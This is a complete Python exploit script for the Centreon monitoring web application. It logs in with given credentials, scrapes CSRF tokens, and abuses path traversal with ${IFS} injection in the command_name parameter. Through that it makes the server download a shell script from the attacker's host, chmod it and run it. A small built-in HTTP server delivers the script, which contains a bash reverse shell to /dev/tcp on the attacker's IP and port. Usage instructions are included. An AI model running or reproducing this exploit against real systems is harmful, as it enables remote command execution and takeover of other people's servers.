import requests
import re
import sys
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import _thread

class S(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.wfile.write("""#!/bin/bash\nbash -i >& /dev/tcp/{}/{} 0>&1""".format(ip, port).encode("utf-8"))

def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if len(sys.argv) < 6:
    print("Start Listener before start exploit")
    print("Usage:\texploit.py url username password ip port")
    print("Ex:\texploit.py http://10.0.0.2/centreon admin S3cUr3_p4ssw0rd 10.0.0.1 4444")
    sys.exit(0)
else:
    base_path, username, password, ip, port = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]
_thread.start_new_thread(run,())
s = requests.Session()
f = s.get(base_path + "/index.php")
token = re.search("""name="centreon_token".* value="(.*?)" />""", f.text).group(1)
space = """${IFS}"""
if token:
    f = s.post(base_path + "/index.php", data={"useralias": username, "password": password, "centreon_token": token, "submitLogin": "Connect"})
    if "You need to enable JavaScript to run this app" in f.text:
        print("Login Successful!")
        f = s.get(base_path + "/main.get.php?p=60904&o=c&resource_id=1")
        token = re.search("""name="centreon_token".* value="(.*?)" />""", f.text).group(1)
        old_path = re.search("""name="resource_line".* value="(.*?)" />""", f.text).group(1)
        print("Sending Payload")
        s.get(base_path + """/main.get.php?p=60801&command_id=&command_name=../../../../../../../bin/curl{}{}/shell.sh{}-o{}/tmp/shell.sh;&command_line=&o=p&min=1""".format(space, ip, space, space))
        print("Setting permissions for the payload")
        s.get(base_path + """/main.get.php?p=60801&command_id=&command_name=../../../../../../../usr/bin/chmod{}775{}/tmp/shell.sh;&command_line=&o=p&min=1""".format(space,space))
        print("Executing Payload\nCheck your listener!")
        s.get(base_path + """/main.get.php?p=60801&command_id=&command_name=../../../../../../../bin/bash{}/tmp/shell.sh;&command_line=&o=p&min=1""".format(space))
    else:
        print("Cannot login to Centreon")
else:
    print("Couldn't get token, check your URL")
